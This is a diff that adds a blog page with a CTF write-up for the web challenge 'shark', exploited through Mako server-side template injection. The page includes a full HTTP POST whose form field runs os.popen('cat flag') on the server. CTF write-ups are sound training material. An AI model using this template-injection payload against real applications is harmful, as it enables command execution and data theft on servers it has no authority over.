@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="/assets/css/normalize.css">
+    <link rel="stylesheet" href="/assets/css/ockham.css">
+    <script async src="/assets/js/ockham.js"></script>
+    <script async src="https://use.fontawesome.com/releases/v5.15.4/js/all.js"></script>
+
+    
+<link rel="icon" href="/assets/img/cryptoicontfc.svg">
+<title>shark | hofill's blog</title>
+
+
+</head>
+
+
+<body>
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <img style="box-shadow: 0px 5px 10px 5px rgba(0,0,0,0.6)" alt="picture of me" src="/assets/img/noria22.png">
+  </div>
+  <div class="sidebar-item">
+    <p>The place where <strike>magic</strike> hacking happens.</p>
+  </div>
+
+  
+  <nav class="sidebar-nav">
+    <ul class="sidebar-nav-list">
+    
+      <li">
+        <a href="/" class="sidebar-nav-item ">
+          Home
+        </a>
+      </li>
+    
+      <li">
+        <a href="/about" class="sidebar-nav-item ">
+          About
+        </a>
+      </li>
+    
+      <li">
+        <a href="/writeups" class="sidebar-nav-item ">
+          Writeups
+        </a>
+      </li>
+    
+      <li">
+        <a href="/blogs" class="sidebar-nav-item ">
+          Blogs
+        </a>
+      </li>
+    
+    </ul>
+  </nav>
+  
+
+  
+  <div class="sidebar-item">
+    
+      <a class="social-icon" href="https://github.com/hofill" target="_blank">
+        <i class="fab fa-github" title="GitHub"></i>
+      </a>
+    
+  </div>
+  
+
+  <div class="sidebar-item">
+    <small>
+      Powered by <a href="https://jekyllrb.com/" target="_blank">Jekyll</a> & <a href="https://github.com/zivong/ockham" target="_blank">Ockham</a>
+    </small>
+  </div>
+</div>
+
+
+<div class="wrap">
+    <div class="container">
+
+        <header class="masthead">
+            <div class="masthead-title">
+                <a href="/" title="Home"><span style="color: #06BCC1">hofill > ./blog</span></a>
+                <small>Crypto enthusiast.</small>
+            </div>
+        </header>
+
+        <main>
+            <article class="post"><img alt="" src="https://unr22-individual.cyberedu.ro/images/contests/BMwo9sxqDZaYqNem.png" class="header-photo"><h1 class="post-title" style="color: #EF596F"><span class="helper">
+        <img class="category-image" alt=""
+                                                          src="/assets/img/categories/web.svg"></span><span
+                class="title">shark</span></h1>
+    <div class="post-meta">
+        <time datetime="2022-05-22T00:00:00+00:00" itemprop="datePublished">
+            22 May 2022
+        </time>•
+        
+        <span itemprop="author" itemscope itemtype="http://schema.org/Person">hofill</span></div>
+    <div class="post-writeup-tags">
+        
+        <div class="type">
+            web
+        </div>
+        
+        <div class="type">
+            SSTI
+        </div>
+        
+        <div class="type">
+            mako
+        </div>
+        
+    </div>
+
+    <h1 id="legend">Legend</h1>
+<ul>
+  <li><a href="#descr">Challenge Description</a></li>
+  <li><a href="#flagproof">Flag Proof</a></li>
+  <li><a href="#summary">Summary</a></li>
+  <li><a href="#details">Details</a></li>
+</ul>
+
+<h1 id="descr">Challenge Description</h1>
+
+<p>Exploit the shark and get the flag!</p>
+
+<h1 id="flagproof">Flag Proof</h1>
+
+<blockquote>
+  <p>CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58}</p>
+
+</blockquote>
+
+<h1 id="summary">Summary</h1>
+
+<p>Mako template injection</p>
+
+<h1 id="details">Details</h1>
+
+<p>On the website given we have an input field, a button, and a hello message. Submitting any value will change the hello message to <code class="language-plaintext highlighter-rouge">Hello &lt;message&gt;!</code>.</p>
+
+<p>Let’s see the headers of the response:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ curl <span class="nt">-I</span> 34.107.115.255:30530                            
+HTTP/1.0 200 OK
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: 213
+Server: Werkzeug/2.0.3 Python/3.6.9
+Date: Sat, 21 May 2022 21:13:26 GMT
+</code></pre></div></div>
+
+<p>We see that it’s a Python server, which means it could be vulnerable to <strong>SSTI</strong>. The title of the challenge mentions a <code class="language-plaintext highlighter-rouge">shark</code>, so the template engine must be <code class="language-plaintext highlighter-rouge">Mako</code>.</p>
+
+<p>As such, we send the following payload (using BurpSuite):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">Host</span><span class="p">:</span> <span class="mf">34.107</span><span class="p">.</span><span class="mf">115.255</span><span class="p">:</span><span class="mi">32539</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mf">10.15</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">100.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">100.0</span>
+<span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">59</span>
+<span class="n">Origin</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">34.107</span><span class="p">.</span><span class="mf">115.255</span><span class="p">:</span><span class="mi">32539</span><span class="o">&gt;</span>
+<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<span class="n">Referer</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">34.107</span><span class="p">.</span><span class="mf">115.255</span><span class="p">:</span><span class="mi">32539</span><span class="o">/&gt;</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span> <span class="mi">1</span>
+
+<span class="n">name</span><span class="o">=&lt;%</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="n">x</span><span class="o">=</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'cat flag'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="c1"># initially 'ls' to see the files in the directory
+</span><span class="o">%&gt;</span>
+<span class="err">$</span><span class="p">{</span><span class="n">x</span><span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>This gives out the flag, and we’ve completed the challenge.</p>
+
+<p>CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58}</p>
+
+
+</article>
+
+
+
+<div class="post-pagination">
+    
+    <a class="post-pagination-item left" href="/writeup/shark-v2">
+        <i class="fas fa-chevron-left"></i> <span class="post-pagination-title">shark-v2
+</span>
+    </a>
+    
+
+    
+    <span class="post-pagination-item right"></span>
+    
+</div>
+
+        </main>
+
+        <footer class="footer">
+            <small>
+                &copy;
+                <time datetime="2022-05-22T21:14:15+00:00">2022</time>&nbsp;<a href="https://github.com/hofill/" target="_blank">hofill</a>. All rights reserved.
+            </small>
+        </footer>
+    </div>
+</div>
+
+<label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+
+
+
+</body>
+</html>
